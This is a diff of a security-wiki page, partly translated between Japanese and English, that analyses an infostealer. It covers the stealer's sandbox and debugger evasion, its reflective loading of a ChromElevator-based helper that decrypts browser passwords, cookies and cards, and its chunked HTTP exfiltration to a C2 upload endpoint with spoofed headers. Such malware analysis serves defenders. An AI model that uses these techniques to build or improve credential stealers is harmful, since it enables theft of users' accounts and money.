-- Variant A はプロセス一覧を走査し、各名前をカスタムのローリングチェックサムでハッシュ化して debuggers/sandboxes の組み込みブロックリストと照合します。チェックサムをコンピューター名にも繰り返し適用し、`C:\analysis` のような作業ディレクトリも確認します。
-- Variant B はシステムプロパティ（プロセス数の下限、最近の稼働時間）を検査し、OpenServiceA("VBoxGuest") を呼び出して VirtualBox additions を検出し、sleep 周りで timing checks を行って single-stepping を見つけます。いずれかがヒットした場合はモジュール起動前に中止します。
+- Variant A はプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、組み込みのブロックリスト（debuggers/sandboxes 向け）と照合する；同じチェックサムをコンピュータ名にも繰り返し、`C:\analysis` のような作業ディレクトリを確認する。
+- Variant B はシステムプロパティ（プロセス数の閾値、最近の uptime）を検査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep 周辺のタイミングチェックで single-stepping を探索する。いずれかが検出されるとモジュール起動前に中止する。
 
 ### Fileless helper + double ChaCha20 reflective loading
 
-- プライマリ DLL/EXE は Chromium credential helper を埋め込んでおり、ディスクにドロップされるか手動で in-memory にマップされます。fileless モードでは imports/relocations を自分で解決するため、ヘルパーのアーティファクトは書き込まれません。
-- そのヘルパーは二重に ChaCha20（32バイト鍵×2＋12バイト nonce）で暗号化されたセカンドステージ DLL を格納します。両パス終了後、blob を reflectively loads（`LoadLibrary` は使用せず）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来するエクスポート `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。
-- ChromElevator ルーチンは direct-syscall reflective process hollowing を使用して稼働中の Chromium ブラウザへ注入し、AppBound Encryption keys を継承して、ABE hardening があっても SQLite データベースからパスワード/クッキー/クレジットカードを直接復号します。
+- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
+- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
+- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.
 
 
-### モジュール式 in-memory 収集 & chunked HTTP exfil
+### モジュール式の in-memory 収集 & chunked HTTP exfil
 
-- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインターテーブルを反復し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、ブラウザ拡張など）ごとにスレッドを立ち上げます。各スレッドは共有バッファに結果を書き込み、約45秒の join ウィンドウ後にファイル数を報告します。
-- 完了後、すべては静的リンクされた `miniz` ライブラリで `%TEMP%\\Log.zip` として圧縮されます。`ThreadPayload1` は 15s スリープし、アーカイブを 10 MB チャンクで HTTP POST によって `http://<C2>:6767/upload` へストリーミングし、ブラウザの `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が付与され、最後のチャンクは `complete: true` を追加して C2 が再構築完了を認識します。
+- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを反復し、有効な各モジュール（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとにスレッドを生成する。各スレッドは結果を共有バッファに書き込み、約45秒の join ウィンドウ後にファイル数を報告する。
+- 完了後、すべては statically linked `miniz` ライブラリで `%TEMP%\\Log.zip` として圧縮される。`ThreadPayload1` は 15 秒 sleep した後、アーカイブを 10 MB チャンクで HTTP POST により `http://<C2>:6767/upload` にストリーミングし、ブラウザの `multipart/form-data` boundary (`----WebKitFormBoundary***`) を偽装する。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後のチャンクには `complete: true` が付与されて C2 が再組立て完了を認識する。
 
-## 参考文献
+## References
 
 - [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
 - [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
@@ -1039,5 +1064,6 @@ Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxe
 - [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 - [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
 - [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
+- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
 
 {{#include ../banners/hacktricks-training.md}}
